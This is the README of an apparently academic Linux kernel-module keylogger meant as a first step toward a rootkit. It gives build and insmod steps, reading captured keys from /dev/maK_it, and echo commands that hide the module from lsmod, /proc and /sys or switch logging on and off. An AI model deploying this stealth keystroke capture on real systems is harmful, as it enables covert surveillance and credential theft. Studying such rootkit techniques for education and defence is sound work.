stealthy-Keylogger-lkm
========================

This is a very simple Keylogger implementation, and is part of a college project
at http://blogs.computing.dcu.ie/wordpress/mak0/

This is the 2nd implementation of my keylogger, this one allows the module to 
be hidden and also demonstrates how our rootkit could take simple commands.

This demonstrates an introduction to simple methods of concealing our rootkit.

To run simply run "make" in the folder with the Makefile.

There is also the option of running scripts/lets_mak_it.sh
This takes 2 arguments, the name of the device to appear in /dev/DEVICE_NAME
and a major number for the device. By default it used a device name of
maK_it and a major number of 33.

To view the logged keys cat /dev/maK_it

install with 
insmod maK_it.ko

Remove with 
rmmod maK_it

Building towards development of a rootkit...

===============
Demo Commands
===============
Hide the module: echo modHide > /dev/.maK_it

Reveal the module: echo modReveal > /dev/.maK_it

We can confirm the module is hidden by running some of the following:

lsmod | grep maK

grep maK /proc/modules

grep maK_it /proc/kallsyms

ls /sys/module | grep maK

modinfo maK_it

modprobe -c | grep maK


Turn Key logger on: echo keyLogOn > /dev/.maK_it

Turn Key logger off: echo keyLogOff > /dev/.maK_it

Turn debug on/off: echo debug > /dev/.maK_it
